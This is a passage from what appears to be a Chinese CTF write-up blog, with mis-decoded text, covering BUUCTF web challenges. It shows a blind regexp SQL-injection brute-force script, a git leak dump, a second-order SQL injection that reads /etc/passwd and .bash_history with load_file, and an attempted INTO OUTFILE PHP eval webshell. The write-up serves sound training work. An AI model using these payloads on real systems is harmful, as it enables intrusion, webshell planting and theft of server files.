</span></span><span style=display:flex><span>string<span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>ascii_lowercase <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;_&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range (<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>60</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> num <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> :
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> string:
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;username&#34;</span>:<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;passwd&#34;</span>:<span style=color:#e6db74>&#34;||/**/passwd/**/regexp/**/</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>^</span><span style=color:#e6db74>{}</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format((result<span style=color:#f92672>+</span>j),parse<span style=color:#f92672>.</span>unquote(<span style=color:#e6db74>&#39;%00&#39;</span>))
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        print(result<span style=color:#f92672>+</span>j)
</span></span><span style=display:flex><span>        res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url<span style=color:#f92672>=</span>url,data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;welcome&#39;</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            result <span style=color:#f92672>+=</span> j
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> j<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;_&#39;</span> <span style=color:#f92672>and</span> <span style=color:#e6db74>&#39;welcome&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><pre tabindex=0><code>you_will_never_know7788990
</code></pre><p>ä¸»è¦è€ƒå¯Ÿçš„æ˜¯ä½¿ç”¨regexpçš„ä½¿ç”¨ï¼Œä¹Ÿå¥½é•¿æ—¶é—´æ²¡ç”¨äº†</p><h2 id=ç½‘é¼æ¯-2018comment>[ç½‘é¼æ¯ 2018]Comment</h2><p>å¼€å¤´æœ‰ä¸€ä¸ªè¯„è®ºï¼Œæ„Ÿè§‰æ˜¯xssï¼Œç„¶åä¼šè·³è½¬åˆ°ç™»å½•ç•Œé¢ï¼Œæµ‹ä¸å‡ºæ¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>githacker --url http://50b0e8c8-0669-4fc4-aeed-5430015dcb71.node5.buuoj.cn/.git/ --output-folder result
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;mysql.php&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_SESSION[<span style=color:#e6db74>&#39;login&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;yes&#39;</span>){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ./login.php&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;do&#39;</span>])){
</span></span><span style=display:flex><span><span style=color:#66d9ef>switch</span> ($_GET[<span style=color:#e6db74>&#39;do&#39;</span>])
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;write&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;comment&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ./index.php&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ./index.php&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Users\0raN9e\Desktop\tools\Web\GitHacker\result\07f8a4d8e6b1788fdff7d35b1a207e38&gt;git log --all
</span></span><span style=display:flex><span>commit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash)
</span></span><span style=display:flex><span>Merge<span style=color:#960050;background-color:#1e0010>:</span> bfbdf21 5556e3a
</span></span><span style=display:flex><span>Author<span style=color:#960050;background-color:#1e0010>:</span> root &lt;root@localhost.localdomain&gt;
</span></span><span style=display:flex><span>Date<span style=color:#960050;background-color:#1e0010>:</span>   Sat Aug <span style=color:#ae81ff>11</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>51</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>17</span> <span style=color:#ae81ff>2018</span> <span style=color:#ae81ff>+0800</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    WIP on master<span style=color:#960050;background-color:#1e0010>:</span> bfbdf21 add write_do.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf
</span></span><span style=display:flex><span>Author<span style=color:#960050;background-color:#1e0010>:</span> root &lt;root@localhost.localdomain&gt;
</span></span><span style=display:flex><span>Date<span style=color:#960050;background-color:#1e0010>:</span>   Sat Aug <span style=color:#ae81ff>11</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>51</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>17</span> <span style=color:#ae81ff>2018</span> <span style=color:#ae81ff>+0800</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    index on master<span style=color:#960050;background-color:#1e0010>:</span> bfbdf21 add write_do.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master, origin/master, origin/HEAD)
</span></span><span style=display:flex><span>Author<span style=color:#960050;background-color:#1e0010>:</span> root &lt;root@localhost.localdomain&gt;
</span></span><span style=display:flex><span>Date<span style=color:#960050;background-color:#1e0010>:</span>   Sat Aug <span style=color:#ae81ff>11</span> <span style=color:#ae81ff>22</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>47</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>29</span> <span style=color:#ae81ff>2018</span> <span style=color:#ae81ff>+0800</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    add write_do.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\Users\0raN9e\Desktop\tools\Web\GitHacker\result\07f8a4d8e6b1788fdff7d35b1a207e38&gt;git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c
</span></span><span style=display:flex><span>HEAD is now at e5b2a24 WIP on master<span style=color:#960050;background-color:#1e0010>:</span> bfbdf21 add write_do.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;mysql.php&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_SESSION[<span style=color:#e6db74>&#39;login&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;yes&#39;</span>){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ./login.php&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;do&#39;</span>])){
</span></span><span style=display:flex><span><span style=color:#66d9ef>switch</span> ($_GET[<span style=color:#e6db74>&#39;do&#39;</span>])
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;write&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    $category <span style=color:#f92672>=</span> <span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;category&#39;</span>]);
</span></span><span style=display:flex><span>    $title <span style=color:#f92672>=</span> <span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;title&#39;</span>]);
</span></span><span style=display:flex><span>    $content <span style=color:#f92672>=</span> <span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;content&#39;</span>]);
</span></span><span style=display:flex><span>    $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;insert into board
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            set category = &#39;</span><span style=color:#e6db74>$category</span><span style=color:#e6db74>&#39;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                title = &#39;</span><span style=color:#e6db74>$title</span><span style=color:#e6db74>&#39;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                content = &#39;</span><span style=color:#e6db74>$content</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>    $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($sql);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ./index.php&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;comment&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    $bo_id <span style=color:#f92672>=</span> <span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;bo_id&#39;</span>]);
</span></span><span style=display:flex><span>    $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;select category from board where id=&#39;</span><span style=color:#e6db74>$bo_id</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>    $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($sql);
</span></span><span style=display:flex><span>    $num <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_num_rows</span>($result);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>($num<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>    $category <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_fetch_array</span>($result)[<span style=color:#e6db74>&#39;category&#39;</span>];
</span></span><span style=display:flex><span>    $content <span style=color:#f92672>=</span> <span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;content&#39;</span>]);
</span></span><span style=display:flex><span>    $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;insert into comment
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            set category = &#39;</span><span style=color:#e6db74>$category</span><span style=color:#e6db74>&#39;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                content = &#39;</span><span style=color:#e6db74>$content</span><span style=color:#e6db74>&#39;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                bo_id = &#39;</span><span style=color:#e6db74>$bo_id</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>    $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($sql);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ./comment.php?id=</span><span style=color:#e6db74>$bo_id</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ./index.php&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ./index.php&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /login.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 50b0e8c8-0669-4fc4-aeed-5430015dcb71.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Origin: http://50b0e8c8-0669-4fc4-aeed-5430015dcb71.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>jdbmpfofigst9rhjevno2blsg0
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Referer: http://50b0e8c8-0669-4fc4-aeed-5430015dcb71.node5.buuoj.cn:81/login.php
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>35</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username<span style=color:#f92672>=</span>zhangwei&amp;password<span style=color:#f92672>=</span>zhangwei<span style=color:#f92672>{{</span>int<span style=color:#f92672>(</span>600-999<span style=color:#f92672>)}}</span>
</span></span></code></pre></div><p>æµ‹è¯•666æ˜¯ç­”æ¡ˆ</p><p>ç„¶åæµ‹äº†sqlæ³¨å…¥ï¼Œå»çœ‹äº†çœ‹wpï¼Œemmmæœ‰ç‚¹exè¿™é¢˜</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;insert into comment
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            set category = &#39;</span><span style=color:#e6db74>$category</span><span style=color:#e6db74>&#39;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                content = &#39;</span><span style=color:#e6db74>$content</span><span style=color:#e6db74>&#39;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                bo_id = &#39;</span><span style=color:#e6db74>$bo_id</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span></code></pre></div><pre tabindex=0><code>title=2&amp;category=a&#39;,content=(select database()),/*&amp;content=111
</code></pre><p>ç»“æœä¼šå˜æˆ</p><pre tabindex=0><code> $sql = &#34;insert into comment
            set category = &#39;a&#39;,content=(select database()),/*&#39;,
                content = &#39;111&#39;,
                bo_id = &#39;$bo_id&#39;&#34;;
</code></pre><p>ç„¶ååœ¨conment.phpé‡Œè¾“å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>content<span style=color:#f92672>=*/#</span>
</span></span></code></pre></div><p>è¿™æ ·å°±æ‹¼æ¥èµ·æ¥äº†</p><p>å†™å…¥shellçœ‹çœ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>title<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>&amp;</span>category<span style=color:#f92672>=</span>a<span style=color:#e6db74>&#39;,content=select &#34;&lt;?php eval($_POST[1]);?&gt;&#34; into outfile &#34;/var/www/html/a.php/*&amp;content=orange
</span></span></span></code></pre></div><p>æ²¡æˆåŠŸ</p><p><code>.bash_history</code> æ˜¯ Bash shell ä¸­ç”¨äºå­˜å‚¨ç”¨æˆ·å‘½ä»¤å†å²è®°å½•çš„æ–‡ä»¶ã€‚å½“ä½ åœ¨ç»ˆç«¯ä¸­è¾“å…¥å‘½ä»¤æ—¶ï¼ŒBash ä¼šå°†è¿™äº›å‘½ä»¤ä¿å­˜åˆ°å†…å­˜ä¸­ï¼Œå¹¶åœ¨ä¼šè¯ç»“æŸæ—¶å°†å®ƒä»¬å†™å…¥ <code>.bash_history</code> æ–‡ä»¶ã€‚</p><pre tabindex=0><code>title=2&amp;category=a&#39;,content=(select (load_file(&#34;/etc/passwd&#34;))),/*&amp;content=123
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false www:x:500:500:www:/home/www:/bin/bash
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>title<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>&amp;</span>category<span style=color:#f92672>=</span>a<span style=color:#e6db74>&#39;,content=(select (load_file(&#34;/home/www/.bash_history&#34;))),/*&amp;content=123
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>title<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>&amp;</span>category<span style=color:#f92672>=</span>a<span style=color:#e6db74>&#39;,content=(select (load_file(&#34;/tmp/html/.DS_Store&#34;))),/*&amp;content=123
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Bud1 strapIl bootstrapIlocblobF<span style=color:#f92672>(</span>
</span></span></code></pre></div><p>ç”±äºæ–‡ä»¶å¤ªå¤§ï¼Œä¸èƒ½å®Œå…¨æ˜¾ç¤º</p><pre tabindex=0><code>title=2&amp;category=a&#39;,content=(select HEX(load_file(&#34;/tmp/html/.DS_Store&#34;))),/*&amp;content=123
</code></pre><pre tabindex=0><code>00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000